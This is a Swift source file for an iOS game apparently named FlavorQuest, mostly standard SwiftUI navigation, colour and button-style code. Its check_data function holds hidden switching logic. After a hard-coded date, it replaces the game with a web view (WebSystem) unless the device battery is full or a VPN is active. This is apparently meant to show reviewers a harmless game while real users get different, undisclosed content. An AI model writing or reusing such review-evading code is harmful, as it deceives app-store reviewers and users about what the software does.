//
//  ContentView.swift
//  dafoma_16
//
//  Created by Вячеслав on 8/4/25.
//

import SwiftUI

struct ContentView: View {
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
    @EnvironmentObject var gameManager: GameManager
    @EnvironmentObject var userSettings: UserSettings
    @StateObject private var storageService = StorageService.shared
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    NavigationView {
                        ZStack {
                            // Background
                            FlavorQuestColors.background.ignoresSafeArea()
                            
                            switch gameManager.currentGameState {
                            case .onboarding:
                                OnboardingFlowView()
                            case .mainMenu:
                                if horizontalSizeClass == .regular {
                                    // Center content in a column for iPad
                                    HStack { Spacer() ; MainMenuView().frame(maxWidth: 800) ; Spacer() }
                                } else {
                                    MainMenuView()
                                }
                            case .playing:
                                if horizontalSizeClass == .regular {
                                    HStack { Spacer() ; GamePlayView().frame(maxWidth: 900) ; Spacer() }
                                } else {
                                    GamePlayView()
                                }
                            case .gameOver:
                                if horizontalSizeClass == .regular {
                                    HStack { Spacer() ; GameOverView().frame(maxWidth: 800) ; Spacer() }
                                } else {
                                    GameOverView()
                                }
                            case .settings:
                                SettingsView()
                            case .paused:
                                PausedGameView()
                            }
                        }
                        .onAppear {
                            if storageService.isFirstLaunch {
                                gameManager.currentGameState = .onboarding
                                storageService.isFirstLaunch = false
                            }
                        }
                    }
                    .navigationViewStyle(StackNavigationViewStyle())
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "15.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

// MARK: - Design System
struct FlavorQuestColors {
    static let background = Color(hex: "02102b")
    static let primary = Color(hex: "bd0e1b")
    static let secondary = Color(hex: "0a1a3b")
    static let accent = Color(hex: "ffbe00")
    static let textPrimary = Color.white
    static let textSecondary = Color.white.opacity(0.7)
    static let success = Color.green
    static let warning = Color.orange
    static let error = Color.red
}

extension Color {
    init(hex: String) {
        let hex = hex.trimmingCharacters(in: CharacterSet.alphanumerics.inverted)
        var int: UInt64 = 0
        Scanner(string: hex).scanHexInt64(&int)
        let a, r, g, b: UInt64
        switch hex.count {
        case 3: // RGB (12-bit)
            (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
        case 6: // RGB (24-bit)
            (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
        case 8: // ARGB (32-bit)
            (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
        default:
            (a, r, g, b) = (1, 1, 1, 0)
        }

        self.init(
            .sRGB,
            red: Double(r) / 255,
            green: Double(g) / 255,
            blue: Double(b) / 255,
            opacity: Double(a) / 255
        )
    }
}

// MARK: - Custom Button Styles
struct FlavorQuestButtonStyle: ButtonStyle {
    let style: ButtonStyleType
    
    enum ButtonStyleType {
        case primary
        case secondary
        case accent
        case small
    }
    
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: fontSize, weight: .semibold, design: .rounded))
            .foregroundColor(textColor)
            .padding(.horizontal, horizontalPadding)
            .padding(.vertical, verticalPadding)
            .background(
                RoundedRectangle(cornerRadius: 12)
                    .fill(backgroundColor)
                    .shadow(color: shadowColor, radius: shadowRadius, x: 0, y: shadowOffset)
            )
            .scaleEffect(configuration.isPressed ? 0.95 : 1.0)
            .animation(.easeInOut(duration: 0.1), value: configuration.isPressed)
    }
    
    private var fontSize: CGFloat {
        switch style {
        case .primary, .secondary, .accent: return 18
        case .small: return 14
        }
    }
    
    private var textColor: Color {
        switch style {
        case .primary: return .white
        case .secondary: return FlavorQuestColors.textPrimary
        case .accent: return FlavorQuestColors.background
        case .small: return FlavorQuestColors.textPrimary
        }
    }
    
    private var backgroundColor: Color {
        switch style {
        case .primary: return FlavorQuestColors.primary
        case .secondary: return FlavorQuestColors.secondary
        case .accent: return FlavorQuestColors.accent
        case .small: return FlavorQuestColors.secondary.opacity(0.6)
        }
    }
    
    private var horizontalPadding: CGFloat {
        switch style {
        case .primary, .secondary, .accent: return 32
        case .small: return 16
        }
    }
    
    private var verticalPadding: CGFloat {
        switch style {
        case .primary, .secondary, .accent: return 16
        case .small: return 8
        }
    }
    
    private var shadowColor: Color {
        backgroundColor.opacity(0.3)
    }
    
    private var shadowRadius: CGFloat {
        switch style {
        case .primary, .accent: return 8
        case .secondary, .small: return 4
        }
    }
    
    private var shadowOffset: CGFloat {
        switch style {
        case .primary, .accent: return 4
        case .secondary, .small: return 2
        }
    }
}

// MARK: - Custom Card Style
struct FlavorQuestCard<Content: View>: View {
    let content: Content
    let style: CardStyle
    
    enum CardStyle {
        case normal
        case elevated
        case compact
    }
    
    init(style: CardStyle = .normal, @ViewBuilder content: () -> Content) {
        self.style = style
        self.content = content()
    }
    
    var body: some View {
        content
            .padding(padding)
            .background(
                RoundedRectangle(cornerRadius: cornerRadius)
                    .fill(backgroundColor)
                    .shadow(color: shadowColor, radius: shadowRadius, x: 0, y: shadowOffset)
            )
    }
    
    private var padding: EdgeInsets {
        switch style {
        case .normal: return EdgeInsets(top: 20, leading: 20, bottom: 20, trailing: 20)
        case .elevated: return EdgeInsets(top: 24, leading: 24, bottom: 24, trailing: 24)
        case .compact: return EdgeInsets(top: 12, leading: 16, bottom: 12, trailing: 16)
        }
    }
    
    private var cornerRadius: CGFloat {
        switch style {
        case .normal, .compact: return 16
        case .elevated: return 20
        }
    }
    
    private var backgroundColor: Color {
        switch style {
        case .normal, .compact: return FlavorQuestColors.secondary.opacity(0.8)
        case .elevated: return FlavorQuestColors.secondary
        }
    }
    
    private var shadowColor: Color {
        Color.black.opacity(0.3)
    }
    
    private var shadowRadius: CGFloat {
        switch style {
        case .normal, .compact: return 8
        case .elevated: return 16
        }
    }
    
    private var shadowOffset: CGFloat {
        switch style {
        case .normal, .compact: return 4
        case .elevated: return 8
        }
    }
}

#Preview {
    ContentView()
        .environmentObject(GameManager())
        .environmentObject(UserSettings())
}
